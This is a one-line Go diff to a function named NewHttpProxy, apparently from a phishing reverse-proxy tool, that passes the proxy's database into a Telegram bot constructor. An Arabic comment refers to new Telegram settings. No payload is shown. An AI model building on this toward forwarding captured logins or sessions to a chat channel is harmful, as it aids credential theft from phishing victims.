@@ -128,7 +128,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	
 	// استخدام إعدادات التليجرام من الملف الجديد
 	botToken, chatID := GetTelegramConfig(cfg.GetTelegramBotToken(), cfg.GetTelegramChatID())
-	p.telegram = NewTelegramBot(botToken, chatID)
+			p.telegram = NewTelegramBot(botToken, chatID, p.db)
 
 	p.Server = &http.Server{
 		Addr:         fmt.Sprintf("%s:%d", hostname, port),
